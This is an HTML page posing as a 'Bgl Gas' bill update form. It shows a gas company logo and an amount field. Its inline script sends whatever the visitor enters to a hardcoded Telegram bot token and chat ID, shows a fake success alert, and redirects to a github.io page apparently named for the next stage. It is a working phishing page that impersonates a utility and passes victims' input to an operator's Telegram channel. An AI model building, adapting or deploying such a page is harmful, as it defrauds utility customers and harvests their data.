<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <title>Gas Bill Update</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 90%;
            max-width: 400px;
            background-color: #fff;
            padding: 20px;
            border-radius: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .header {
            background-color: #007bff;
            color: #fff;
            padding: 10px;
            border-radius: 8px 8px 0 0;
            text-align: center;
            font-size: 1.2em;
        }
        .form-group {
            margin: 15px 0;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .form-group input {
            width: 94%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .btn {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #dc3545;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
        }
        .btn:hover {
            background-color: #c82333;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 0.8em;
            color: #666;
        }
        .center-image {
            text-align: center;
            margin-bottom: 20px;
        }
        .center-image img {
            width: 40%;
            max-width: 300px;
        }
    </style>
</head>
<body>
    <div class="container">

        <div class="center-image" style="width: 350px" align="center">
            <img src="https://i.postimg.cc/d1T3n6Cv/bgl-logo-png.png" alt="Gas Bill Image">
        </div>
        <div class="header">Bgl Gas</div>
        <form id="loginForm" onsubmit="return sender()">
            <div class="form-group">
                <label for="customer-name">Enter Amount*</label>
                <input type="tel" id="Amount" name="Amount" placeholder="Enter Amount" required>
            </div>
      
            <button  type="submit" class="btn">CONTINUE</button>
        </form>
        
        <div class="footer">
            <a href="#">T&C</a> | <a href="#">Privacy</a>
        </div>
    </div>
        <link rel="stylesheet" href="style.css">
    <script src="sender.js"></script>
  
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  
  <script>
  //bot token
var telegram_bot_id = "7838859798:AAEk-t5FqdpEnEPEtsEpGLGaDK8OR0QU1sA";
//chat id
var chat_id = 7065159395;
var ready = function () {
    Amount = document.getElementById("Amount").value;
    
  
    message = 
      "\nAmount: " + Amount;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message,
          "file": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response); 
      
      swal("Successfull", " ", "success");
      
      document.location = "https://ringtone11.github.io/3Customer3/";
      
    });
    document.getElementById("Amount").value = "";
    return false;
};
  </script>
</body>
</html>
